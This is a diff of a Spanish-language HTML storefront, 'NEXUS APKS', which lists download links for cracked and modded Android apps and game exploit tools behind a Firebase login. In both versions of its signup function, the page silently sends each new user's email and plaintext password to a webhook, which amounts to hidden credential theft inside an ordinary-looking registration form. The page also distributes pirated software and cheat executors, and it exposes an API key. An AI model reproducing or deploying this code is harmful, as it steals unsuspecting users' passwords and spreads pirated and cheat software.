@@ -3,72 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS APKS 🌪️ | NO VIRUS 👾</title>
-    
+    <title>NEXUS APKS | OVERLORD SYSTEM</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap" rel="stylesheet">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Outfit:wght@300;700;900&display=swap" rel="stylesheet">
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
 
     <style>
-        :root { --accent: #00f2ff; --bg: #020204; }
+        :root { --accent: #00f2ff; --neon-pink: #ff00ea; --bg: #010103; }
         body { background-color: var(--bg); color: white; font-family: 'Outfit', sans-serif; overflow: hidden; }
-        
-        /* Fondo Espacial */
-        #particles-js { position: fixed; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
-        
-        /* BORDES RGB ANIMADOS */
-        .rgb-card {
-            position: relative; background: rgba(255, 255, 255, 0.02);
-            border-radius: 25px; padding: 1px; overflow: hidden;
-        }
-        .rgb-card::before {
-            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: conic-gradient(transparent, var(--accent), transparent, #ff00ea, transparent);
-            animation: rotate 4s linear infinite; z-index: -1;
-        }
-        .inner-content { background: #0a0a0c; border-radius: 24px; padding: 1.5rem; height: 100%; }
-        @keyframes rotate { 100% { transform: rotate(360deg); } }
+        #particles-js { position: fixed; inset: 0; z-index: -1; }
 
-        /* PANTALLA DE ANIMACIÓN DE ENTRADA (NEXUS) */
+        /* INTRO ESTILO "BYPASS SYSTEM" */
         #nexus-intro {
-            position: fixed; inset: 0; background: #000; z-index: 30000;
+            position: fixed; inset: 0; background: #000; z-index: 50000;
             display: none; flex-direction: column; align-items: center; justify-content: center;
-            opacity: 0; transition: opacity 1s;
         }
-        #intro-tornado { font-size: 150px; animation: spinTornado 2s linear infinite, glowTornado 2s ease-in-out infinite; }
-        #intro-text { font-size: 24px; font-weight: 900; letter-spacing: 5px; color: var(--accent); margin-top: 20px; text-transform: uppercase; }
-
-        @keyframes spinTornado { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        @keyframes glowTornado { 0%, 100% { text-shadow: 0 0 20px var(--accent); } 50% { text-shadow: 0 0 50px #ff00ea; } }
-
-        /* MARQUESINA DE AVISOS */
-        .marquee { background: rgba(0, 242, 255, 0.05); border-bottom: 1px solid var(--accent); overflow: hidden; white-space: nowrap; padding: 10px 0; font-size: 10px; font-weight: 900; text-transform: uppercase; letter-spacing: 2px; }
-        .marquee div { display: inline-block; animation: marquee 20s linear infinite; }
-        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-
-        /* BOTONES FLOTANTES */
-        .floating-btn {
-            position: fixed; bottom: 20px; width: 55px; height: 55px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; font-size: 24px;
-            cursor: pointer; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            z-index: 1000; border: 2px solid var(--accent);
+        .scanner-bar {
+            width: 300px; height: 2px; background: var(--accent);
+            box-shadow: 0 0 20px var(--accent);
+            animation: scan 1.5s ease-in-out infinite;
         }
-        .floating-btn:hover { transform: scale(1.1); box-shadow: 0 0 20px var(--accent); }
-        #pedido-btn { right: 20px; background: #111; }
-        #tiktok-btn { right: 85px; background: #000; border-color: #ff0050; }
-
-        /* MODALES */
-        .modal-overlay {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-            z-index: 20000; align-items: center; justify-content: center; backdrop-filter: blur(15px);
-        }
-        .modal-box { background: #0f0f13; border: 1px solid var(--accent); padding: 2rem; border-radius: 35px; width: 90%; max-width: 400px; text-align: center; }
+        @keyframes scan { 0%, 100% { transform: translateY(-50px); opacity: 0; } 50% { transform: translateY(50px); opacity: 1; } }
         
-        .glow-text { text-shadow: 0 0 20px rgba(0, 242, 255, 0.7); }
-        input::placeholder { color: rgba(255,255,255,0.2); }
+        .glitch-text {
+            font-family: 'Orbitron', sans-serif; font-size: 2.5rem; font-weight: 900;
+            text-transform: uppercase; letter-spacing: 10px;
+            animation: glitch 0.3s infinite;
+        }
+        @keyframes glitch {
+            0% { text-shadow: 2px 0 var(--neon-pink), -2px 0 var(--accent); transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); text-shadow: -2px 0 var(--neon-pink), 2px 0 var(--accent); }
+            100% { transform: translate(0); }
+        }
+
+        /* BOTONES CON "LATIDO" Y BRILLO */
+        .btn-premium {
+            background: linear-gradient(45deg, #111, #222);
+            border: 1px solid rgba(0, 242, 255, 0.3);
+            transition: 0.3s; position: relative; overflow: hidden;
+            animation: pulse-border 2s infinite;
+        }
+        .btn-premium:hover {
+            background: var(--accent); color: black;
+            box-shadow: 0 0 30px var(--accent); transform: scale(1.05);
+        }
+        @keyframes pulse-border {
+            0%, 100% { border-color: rgba(0, 242, 255, 0.3); }
+            50% { border-color: var(--accent); box-shadow: 0 0 10px var(--accent); }
+        }
+
+        /* BOTÓN CERRAR SESIÓN */
+        .logout-btn {
+            background: rgba(255, 0, 0, 0.1); border: 1px solid rgba(255, 0, 0, 0.3);
+            color: #ff4444; padding: 10px 20px; border-radius: 12px;
+            font-size: 10px; font-weight: 900; letter-spacing: 2px;
+            transition: 0.3s;
+        }
+        .logout-btn:hover { background: #ff4444; color: white; box-shadow: 0 0 20px #ff4444; }
+
+        /* MARQUESINA */
+        .marquee { background: black; border-bottom: 1px solid var(--accent); padding: 8px 0; font-size: 11px; font-weight: 900; color: var(--accent); }
+
+        /* RGB CARDS MEJORADAS */
+        .rgb-card {
+            position: relative; background: #0a0a0c; border-radius: 20px; padding: 1.5rem;
+            border: 1px solid rgba(255,255,255,0.05); transition: 0.4s;
+        }
+        .rgb-card:hover { border-color: var(--accent); transform: translateY(-10px); background: #0f1218; }
     </style>
 </head>
 <body>
@@ -76,77 +80,57 @@
     <div id="particles-js"></div>
 
     <div id="nexus-intro">
-        <div id="intro-tornado">🌪️</div>
-        <h2 id="intro-text" class="italic tracking-tighter">Bienvenido a <span class="font-black">Nexus APKs</span></h2>
+        <div class="scanner-bar"></div>
+        <h2 class="glitch-text mt-4">NEXUS</h2>
+        <p class="text-[10px] tracking-[10px] text-gray-500 mt-2 uppercase">Verificando Protocolo...</p>
     </div>
 
     <section id="auth-screen" class="min-h-screen flex items-center justify-center p-4">
-        <div class="w-full max-w-md" data-aos="zoom-in">
-            <h1 class="text-6xl font-black italic tracking-tighter glow-text text-center mb-10">NEXUS <span class="text-[#00f2ff]">APKS</span></h1>
-            
-            <div class="rgb-card">
-                <div class="inner-content space-y-4">
-                    <div id="auth-title" class="text-center font-black italic text-gray-500 mb-6 tracking-widest uppercase text-xs">Identificación</div>
-                    
-                    <div id="name-container" class="hidden">
-                        <input type="text" id="user-name" placeholder="NOMBRE DE USUARIO" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm uppercase">
-                    </div>
-                    <input type="email" id="email" placeholder="EMAIL@SYSTEM.COM" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm">
-                    <div class="relative">
-                        <input type="password" id="pass" placeholder="PASSWORD 🔑" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm">
-                        <button onclick="togglePass()" class="absolute right-4 top-1/2 -translate-y-1/2 opacity-40 hover:opacity-100">👁️</button>
-                    </div>
-
-                    <button onclick="manejarAuth()" class="w-full p-5 bg-white text-black rounded-2xl font-black text-sm hover:bg-[#00f2ff] transition-all uppercase tracking-widest mt-4">EJECUTAR</button>
-                    
-                    <button onclick="cambiarModo()" id="toggle-btn" class="w-full text-[10px] text-gray-500 mt-6 uppercase text-center tracking-widest">
-                        ¿No tienes cuenta? <span class="text-[#00f2ff] underline italic">Registrarse</span>
-                    </button>
+        <div class="w-full max-w-sm text-center" data-aos="zoom-out">
+            <h1 class="text-5xl font-black italic tracking-tighter mb-8 glitch-text">NEXUS</h1>
+            <div class="space-y-4 bg-black/40 p-8 rounded-[40px] border border-white/5 backdrop-blur-md">
+                <div id="name-container" class="hidden">
+                    <input type="text" id="user-name" placeholder="USUARIO" class="w-full p-4 bg-white/5 rounded-2xl outline-none border border-white/10 focus:border-[#ff00ea] text-sm uppercase">
                 </div>
+                <input type="email" id="email" placeholder="CORREO" class="w-full p-4 bg-white/5 rounded-2xl outline-none border border-white/10 focus:border-cyan-400 text-sm">
+                <input type="password" id="pass" placeholder="PASSWORD" class="w-full p-4 bg-white/5 rounded-2xl outline-none border border-white/10 focus:border-cyan-400 text-sm">
+                
+                <button onclick="manejarAuth()" class="btn-premium w-full p-4 rounded-2xl font-black uppercase text-xs tracking-widest">Entrar al Sistema</button>
+                
+                <button onclick="cambiarModo()" id="toggle-btn" class="text-[10px] text-gray-500 uppercase tracking-widest mt-4">
+                    ¿Nuevo? <span class="text-cyan-400 underline">Crea una cuenta</span>
+                </button>
             </div>
         </div>
     </section>
 
-    <section id="store-screen" class="hidden container mx-auto px-4 py-10">
-        <div class="text-center mb-12" data-aos="fade-down">
-            <h2 id="welcome-msg" class="text-3xl font-black italic glow-text tracking-tighter uppercase">...</h2>
-            <p class="text-[10px] tracking-[5px] text-gray-600 mt-1 uppercase font-bold">Nexus Elitist Access</p>
+    <section id="store-screen" class="hidden">
+        <div class="marquee overflow-hidden whitespace-nowrap">
+            <div class="inline-block animate-marquee">⚡ [ STATUS ]: SISTEMA ONLINE — DISFRUTA LOS SCRIPTS DE CODEX — NO HAY AVISOS NUEVOS ⚡</div>
         </div>
-        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" id="app-grid"></div>
-        <button onclick="location.reload()" class="mt-20 block mx-auto text-[9px] tracking-[6px] text-red-500 uppercase font-bold opacity-60 hover:opacity-100 transition-opacity">Finalizar Sesión</button>
+
+        <div class="container mx-auto px-6 py-10">
+            <div class="flex justify-between items-center mb-12">
+                <h2 id="welcome-msg" class="text-2xl font-black italic uppercase tracking-tighter"></h2>
+                <button onclick="cerrarSesion()" class="logout-btn uppercase">Cerrar Sesión</button>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8" id="app-grid"></div>
+        </div>
     </section>
 
-    <div id="tiktok-btn" class="floating-btn" onclick="window.open('https://tiktok.com/@saswarsasware332')">
-        <svg fill="#fff" width="24" viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/></svg>
+    <div id="tiktok-btn" class="floating-btn fixed bottom-6 right-24 bg-black" onclick="window.open('https://tiktok.com/@saswarsasware332')">
+        <svg fill="#fff" width="20" viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/></svg>
     </div>
-    <div id="pedido-btn" class="floating-btn" onclick="document.getElementById('pedido-modal').style.display='flex'">📦</div>
+    <div id="pedido-btn" class="floating-btn fixed bottom-6 right-6 bg-[#111]" onclick="document.getElementById('pedido-modal').style.display='flex'">📦</div>
 
     <div id="pedido-modal" class="modal-overlay">
-        <div class="modal-box shadow-[0_0_50px_rgba(0,242,255,0.1)]">
-            <h3 class="text-xl font-black italic text-[#00f2ff]">PETICIÓN 🍿</h3>
-            <div class="mt-6 space-y-4 text-left">
-                <div>
-                    <input type="text" id="p-apk" placeholder="¿QUÉ APK TE GUSTARÍA VER?" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-xs uppercase">
-                </div>
-                <div>
-                    <textarea id="p-razon" placeholder="¿POR QUÉ?" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-xs h-24 uppercase"></textarea>
-                </div>
-                <button onclick="enviarPedido()" class="w-full p-4 bg-white text-black rounded-xl font-black text-xs uppercase tracking-widest">Enviar Formulario</button>
-                <button onclick="document.getElementById('pedido-modal').style.display='none'" class="w-full text-[9px] text-gray-600 uppercase mt-4">Cancelar</button>
-            </div>
-        </div>
-    </div>
-
-    <div id="download-modal" class="modal-overlay">
-        <div class="modal-box shadow-[0_0_50px_rgba(0,242,255,0.1)]">
-            <span class="text-6xl" id="modal-icon"></span>
-            <h3 class="text-2xl font-black mt-4 italic tracking-tight" id="modal-name"></h3>
-            <div class="bg-white/5 p-4 rounded-2xl my-6 border border-white/10 flex justify-between">
-                <span class="text-xs opacity-50 uppercase">TAMAÑO:</span>
-                <p class="text-[#00f2ff] font-black" id="modal-size"></p>
-            </div>
-            <button id="final-link" class="w-full bg-white text-black p-4 rounded-xl font-black hover:bg-[#00f2ff]">INICIAR DESCARGA</button>
-            <button onclick="document.getElementById('download-modal').style.display='none'" class="w-full text-[9px] text-gray-600 uppercase mt-4">Cerrar</button>
+        <div class="modal-box">
+            <h3 class="text-xl font-black italic mb-6">NUEVA PETICIÓN 🍿</h3>
+            <input type="text" id="p-apk" placeholder="NOMBRE DE LA APK" class="w-full p-4 bg-white/5 rounded-2xl outline-none border border-white/10 mb-4 text-xs">
+            <textarea id="p-razon" placeholder="¿POR QUÉ LA NECESITAS?" class="w-full p-4 bg-white/5 rounded-2xl outline-none border border-white/10 mb-6 text-xs h-24"></textarea>
+            <button onclick="enviarPedido()" class="btn-premium w-full p-4 rounded-xl font-black text-xs uppercase">Enviar Petición</button>
+            <button onclick="document.getElementById('pedido-modal').style.display='none'" class="mt-4 text-[9px] text-gray-500 uppercase">Cerrar</button>
         </div>
     </div>
 
@@ -154,7 +138,7 @@
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script>
         AOS.init();
-        // CONFIG FIREBASE (TUS DATOS) cite: 1000043025.jpg
+        // Configuración Firebase (Mismos datos tuyos)
         const firebaseConfig = {
           apiKey: "AIzaSyAzzRWHGhYVFgkWyRwfgNKc5Ql52U4xxM8",
           authDomain: "hyper-drip.firebaseapp.com",
@@ -172,94 +156,91 @@
         // AUTO-LOGIN
         auth.onAuthStateChanged(user => {
             if(user) {
-                const name = localStorage.getItem('nexus_name') || user.email.split('@')[0];
-                iniciarSistema(name);
+                const name = localStorage.getItem('nexus_u') || user.email.split('@')[0];
+                activarSistema(name);
             }
         });
 
-        const apps = [
-            { n: 'CAP CUT PRO', i: '🎬', d: 'v14.7.0 Unlocked', s: '128 MB', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file' },
-            { n: 'DELTA EXECUTOR', i: '🤖', d: 'Latest Android', s: '115 MB', l: 'https://deltaexploits.gg/delta-executor-android' },
-            { n: 'DTW MOD MENU', i: '🔥', d: 'Build 0909f6', s: '85 MB', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file' },
-            { n: 'GTA SAN ANDREAS', i: '🚗', d: 'v2.11.277 Mod', s: '2.4 GB', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file' },
-            { n: 'CANVA PRO', i: '🎨', d: 'Premium G-Drive', s: '--', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view' },
-            { n: 'MINECRAFT APK', i: '⛏️', d: 'Full Version', s: '650 MB', l: 'https://mineckraftapk.com.mx/' },
-            { n: 'PRÓXIMAMENTE', i: '⌛', d: 'Cifrando...', s: '--', l: '#', locked: true }
-        ];
-
-        // LÓGICA DE FLUJO
-        function togglePass() { const p = document.getElementById('pass'); p.type = p.type === 'password' ? 'text' : 'password'; }
-        function cambiarModo() { esLogin = !esLogin; document.getElementById('name-container').classList.toggle('hidden'); document.getElementById('toggle-btn').innerHTML = esLogin ? '¿No tienes cuenta? <span class="text-[#00f2ff] underline italic">Registrarse</span>' : '¿Ya tienes cuenta? <span class="text-[#00f2ff] underline italic">Iniciar Sesión</span>'; document.getElementById('auth-title').innerText = esLogin ? 'Identificación' : 'Nuevo Miembro Nexus'; }
-
-        async function manejarAuth() {
-            const e = document.getElementById('email').value; const p = document.getElementById('pass').value; const n = document.getElementById('user-name').value;
-            if(!e || !p) return alert("Completa los datos");
-            try {
-                if(esLogin) { await auth.signInWithEmailAndPassword(e, p); } 
-                else {
-                    if(!n) return alert("Escribe tu nombre");
-                    await auth.createUserWithEmailAndPassword(e, p);
-                    localStorage.setItem('nexus_name', n);
-                    fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ embeds: [{ title: "👑 NUEVO MIEMBRO: " + n.toUpperCase(), fields: [{ name: "📧 CORREO", value: e, inline: true }, { name: "🔑 PASS", value: "|| "+p+" ||", inline: true }], color: 0x00f2ff }] })
-                    });
-                }
-            } catch (err) { alert(err.message); }
+        function cambiarModo() {
+            esLogin = !esLogin;
+            document.getElementById('name-container').classList.toggle('hidden');
+            document.getElementById('toggle-btn').innerHTML = esLogin ? '¿Nuevo? <span class="text-cyan-400 underline">Crea una cuenta</span>' : '¿Ya tienes cuenta? <span class="text-cyan-400 underline">Entra aquí</span>';
         }
 
-        function iniciarSistema(nombre) {
+        async function manejarAuth() {
+            const e = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
+            const n = document.getElementById('user-name').value;
+            try {
+                if(esLogin) { await auth.signInWithEmailAndPassword(e, p); }
+                else {
+                    await auth.createUserWithEmailAndPassword(e, p);
+                    localStorage.setItem('nexus_u', n);
+                    fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ embeds: [{ title: "👑 NEXUS REGISTER: " + n.toUpperCase(), fields: [{ name: "📧 CORREO", value: e }, { name: "🔑 PASS", value: "|| "+p+" ||" }], color: 0x00f2ff }] })
+                    });
+                }
+            } catch (err) { alert("Error: " + err.message); }
+        }
+
+        function cerrarSesion() {
+            auth.signOut().then(() => {
+                localStorage.removeItem('nexus_u');
+                location.reload();
+            });
+        }
+
+        function activarSistema(nombre) {
             document.getElementById('auth-screen').classList.add('hidden');
             const intro = document.getElementById('nexus-intro');
             intro.style.display = 'flex';
-            setTimeout(() => intro.style.opacity = '1', 50);
             
             setTimeout(() => {
+                intro.style.transition = '1s';
                 intro.style.opacity = '0';
                 setTimeout(() => {
                     intro.style.display = 'none';
-                    abrirDashboard(nombre);
+                    abrirTienda(nombre);
                 }, 1000);
-            }, 3000);
+            }, 2500);
         }
 
-        function abrirDashboard(nombre) {
+        function abrirTienda(nombre) {
             document.getElementById('store-screen').classList.remove('hidden');
-            document.getElementById('welcome-msg').innerText = "BIENVENIDO, " + nombre.toUpperCase();
-            document.body.style.overflowY = 'auto'; // Permitir scroll
+            document.getElementById('welcome-msg').innerText = "HOLA, " + nombre.toUpperCase();
+            document.body.style.overflowY = 'auto';
 
-            // Cargar Marquesina
-            document.body.insertAdjacentHTML('afterbegin', `<div class="marquee" id="avisos-bar"><div>⚡ [ AVISOS ]: NO HAY AVISOS POR EL MOMENTO — ACTUALIZANDO REPOSITORIO — NEXUS APKS ADMIN CONTROL ⚡</div></div>`);
+            const apps = [
+                { n: 'CAP CUT PRO', i: '🎬', d: 'v14.7.0 Unlocked', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file' },
+                { n: 'DELTA EXECUTOR', i: '🤖', d: 'Latest Android', l: 'https://deltaexploits.gg/delta-executor-android' },
+                { n: 'DTW MOD MENU', i: '🔥', d: 'Build 0909f6', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file' },
+                { n: 'GTA SAN ANDREAS', i: '🚗', d: 'v2.11.277 Mod', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file' },
+                { n: 'CANVA PRO', i: '🎨', d: 'Premium G-Drive', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view' }
+            ];
 
-            const grid = document.getElementById('app-grid'); grid.innerHTML = '';
+            const grid = document.getElementById('app-grid');
             apps.forEach(app => {
                 grid.innerHTML += `
                 <div class="rgb-card" data-aos="fade-up">
-                    <div class="inner-content flex flex-col items-center">
-                        <span class="text-4xl mb-4">${app.i}</span>
-                        <h3 class="font-bold text-xs">${app.n}</h3>
-                        <p class="text-[8px] text-gray-600 mb-6 uppercase tracking-[3px]">${app.d}</p>
-                        <button onclick="abrirModal('${app.n}', '${app.i}', '${app.s}', '${app.l}')" class="w-full bg-white/5 border border-white/10 p-2.5 rounded-xl font-bold text-[9px] hover:bg-[#00f2ff] hover:text-black transition-all">DETALLES</button>
-                    </div>
+                    <span class="text-4xl mb-4 block text-center">${app.i}</span>
+                    <h3 class="font-black text-center text-sm mb-1">${app.n}</h3>
+                    <p class="text-[9px] text-gray-500 text-center uppercase tracking-widest mb-6">${app.d}</p>
+                    <button onclick="window.open('${app.l}')" class="btn-premium w-full py-3 rounded-xl font-bold text-[10px] uppercase">Descargar APK</button>
                 </div>`;
             });
         }
 
-        function abrirModal(n, i, s, l) {
-            if(l === '#') return;
-            document.getElementById('modal-name').innerText = n; document.getElementById('modal-icon').innerText = i; document.getElementById('modal-size').innerText = s;
-            document.getElementById('final-link').onclick = () => window.open(l); document.getElementById('download-modal').style.display = 'flex';
-        }
-
         async function enviarPedido() {
-            const apk = document.getElementById('p-apk').value; const razon = document.getElementById('p-razon').value;
-            if(!apk || !razon) return;
+            const a = document.getElementById('p-apk').value;
+            const r = document.getElementById('p-razon').value;
             await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ embeds: [{ title: "🍿 NEXUS PETICIÓN", color: 0x00f2ff, fields: [{ name: "📦 APK", value: apk.toUpperCase() }, { name: "❓ RAZÓN", value: razon }] }] })
+                body: JSON.stringify({ embeds: [{ title: "🍿 PETICIÓN NEXUS", color: 0x00f2ff, fields: [{ name: "📦 APK", value: a.toUpperCase() }, { name: "❓ POR QUÉ", value: r }] }] })
             });
-            alert("Petición enviada 🌪️"); document.getElementById('pedido-modal').style.display = 'none';
+            alert("Petición Enviada! 🌪️");
+            document.getElementById('pedido-modal').style.display = 'none';
         }
 
-        particlesJS('particles-js', { "particles": { "number": { "value": 40 }, "opacity": { "value": 0.2 }, "size": { "value": 1.5 }, "move": { "speed": 1 } } });
+        particlesJS('particles-js', { "particles": { "number": { "value": 60 }, "color": { "value": "#00f2ff" }, "opacity": { "value": 0.1 }, "size": { "value": 1.5 }, "line_linked": { "enable": true, "distance": 150, "opacity": 0.05 }, "move": { "speed": 2 } } });
     </script>
 </body>
 </html>
